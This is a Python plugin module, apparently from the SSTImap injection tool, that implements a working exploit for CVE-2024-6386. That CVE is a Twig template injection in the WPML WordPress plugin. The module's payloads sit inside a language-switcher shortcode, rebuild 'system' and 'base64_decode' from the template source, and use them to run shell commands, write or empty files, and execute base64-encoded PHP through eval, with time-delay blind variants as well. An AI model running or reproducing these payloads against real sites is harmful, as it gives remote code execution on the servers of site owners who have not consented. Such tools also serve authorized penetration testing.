from plugins.languages import php
from core import bash
from utils import rand


class CVE_2024_6386(php.Php):
    generic_plugin = False
    header_type = 'add'
    sstimap_version = '1.2.3'
    def init(self):
        # WPML Multilingual CMS Plugin for WordPress before 4.6.13 was vulnerable to SSTI in Twig
        # CVE by https://github.com/stealthcopter/
        self.update_actions({
            'render': {
                'render': '{code}',
                # Disable errors, so that "system" will not corrupt the output with a warning
                # source(_self) offset after header is 155+header_len(21)
                'header': ('<!-- wp:shortcode -->'
                           '[wpml_language_switcher]'
                           '{{#error_reportingini_set#}}'
                           '{{% set er = source(_self)|slice(2,15) %}}'
                           '{{% set is = source(_self)|slice(17,7) %}}'
                           '{{% for a in [er, 0]|sort(is) %}}{{% endfor %}}'
                           '{{{{{header[0]}+{header[1]}}}}}'),
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}'
                           '[/wpml_language_switcher]<!-- /wp:shortcode -->',
                'test_render': f'{{#0{rand.randstrings[0]}\n#}}'
                               f'{{% set z = source(_self)|slice(176,1) %}}'
                               f'{{% set rs = source(_self)|slice(177,{1+len(rand.randstrings[0])}) %}}'
                               f'{{{{(1..3)|join(z)}}}}'
                               f'{{{{rs|nl2br}}}}',
                'test_render_expected': f'10203{rand.randstrings[0]}<br \\/>\\n'
            },
            'write': {
                'call': 'inject',
                'write': "<!-- wp:shortcode -->"
                         "[wpml_language_switcher]"
                         "{{#systembase64_decode{chunk_b64p}|base64 -d >> {path}#}}"
                         "{{% set s = source(_self)|slice(2,6) %}}"
                         "{{% set b = source(_self)|slice(8,13) %}}"
                         "{{% set p = [source(_self)|slice(21,{lens[clen64p]})]|map(b)[0] %}}"
                         "{{% set f = source(_self)|slice(21+{lens[clen64p]}, 14+{lens[path]}) %}}"
                         "{{% set pf = p~f %}}"
                         "{{% for a in [pf]|map(s) %}}"
                         "{{% endfor %}}"
                         "[/wpml_language_switcher]"
                         "<!-- /wp:shortcode -->",
                'truncate': "<!-- wp:shortcode -->"
                            "[wpml_language_switcher]"
                            "{{#systemecho -n > {path}#}}"
                            "{{% set s = source(_self)|slice(2,6) %}}"
                            "{{% set p = source(_self)|slice(8,10+{lens[path]}) %}}"
                            "{{% for a in [p]|map(s) %}}"
                            "{{% endfor %}}"
                            "[/wpml_language_switcher]"
                            "<!-- /wp:shortcode -->"
            },
            # Hackish way to evaluate PHP code
            'evaluate': {
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'execute': {
                'call': 'render',
                'execute': "{{#0systembase64_decode{code_b64p}#}}"
                           "{{% set z = source(_self)|slice(176,1) %}}"
                           "{{% set s = source(_self)|slice(177,6) %}}"
                           "{{% set b = source(_self)|slice(183,13) %}}"
                           #"{{% set p = [source(_self)|slice(185,{clen64p})]|map(b)|join|slice(0,{clen})%}}"
                           "{{% set p = [source(_self)|slice(196,{lens[clen64p]})]|map(b)[0] %}}"
                           #"{{{{p}}}}",
                           "{{% for a in [p]|map(s) %}}"
                           "{{% endfor %}}",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': "<!-- wp:shortcode -->"
                                 "[wpml_language_switcher]"
                                 "{{#systembase64_decode{code_b64p}&&sleep {delay}#}}"
                                 "{{% set s = source(_self)|slice(2,6) %}}"
                                 "{{% set b = source(_self)|slice(8,13) %}}"
                                 "{{% set p = [source(_self)|slice(21,{lens[clen64p]})]|map(b)[0] %}}"
                                 "{{% set t = source(_self)|slice(21+{lens[clen64p]}, 8+{lens[delay]}) %}}"
                                 "{{% set pt = p~t %}}"
                                 "{{% for a in [pt]|map(s) %}}"
                                 "{{% endfor %}}"
                                 "[/wpml_language_switcher]"
                                 "<!-- /wp:shortcode -->"
            },
            'evaluate_blind': {
                'call': 'execute',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0}
        ])
